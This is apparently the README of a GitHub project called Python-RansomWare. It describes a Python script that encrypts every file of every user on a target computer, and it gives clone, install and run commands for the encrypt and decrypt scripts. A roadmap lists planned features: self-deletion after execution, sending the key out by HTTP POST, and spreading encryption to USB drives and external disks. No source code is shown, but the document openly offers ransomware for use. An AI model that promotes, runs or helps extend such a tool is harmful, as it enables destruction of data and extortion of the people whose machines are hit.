# Python-RansomWare
Python3 script to encrypt all the files of all the users in a target computer

# Installation
- Clone repository

```Git clone https://github.com/Jael-G/Python-RansomWare```
- Access folder

```cd Python-RansomWare```

- Install requirements

```pip install -r requirements.txt```

- Run script

  - To encrypt:

    Windows:
      ```python encrypt.py```
  
    Linux:
      ```python3 encrypt.py```

  - To decrypt:

    Windows:
      ```python decrypt.py```
  
    Linux:
      ```python3 decrypt.py```


# IMPORTANT
- Once executed, the script will try to encrypt everything on the computer. Be careful!
- If the script is executed, the decrypt.py file will also be encrypted and unusable. Make sure you have an extra copy saved in another computer or in a location that it won't get encrypted
- There are plenty of notes at the end of encrypt.py, be sure to read it

# Working On:
- Making the script safe delete itself after execution in linux
- Adding feature to HTTP Post the key used to encrypt the files (MIGHT CANCEL THIS PART)
- Encrypted mounted volumes, e.g., USB flash drive, SD card, External HDD/SSD

